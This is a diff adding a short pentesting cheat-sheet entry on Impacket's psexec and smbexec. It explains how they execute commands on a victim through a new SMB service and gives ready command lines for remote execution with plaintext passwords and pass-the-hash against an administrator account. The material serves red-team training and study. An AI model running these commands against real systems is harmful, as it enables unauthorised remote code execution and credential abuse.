@@ -1,0 +1,18 @@
+Both options will create a new service (using \pipe\svcctl via SMB) 
+in the victim machine and use it to execute something (psexec will 
+upload an executable file to ADMIN$ share and smbexec will point to 
+cmd.exe/powershell.exe and put in the arguments the 
+payload --file-less technique--).
+
+More info about psexec and smbexec.
+In kali it is located on /usr/share/doc/python3-impacket/examples/
+
+bash
+#If no password is provided, it will be prompted
+
+./psexec.py [[domain/]username[:password]@]<targetName or address>
+./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
+psexec \\192.168.122.66 -u Administrator -p 123456Ww
+psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
+
+Using parameter-k you can authenticate against kerberos instead of NTLM
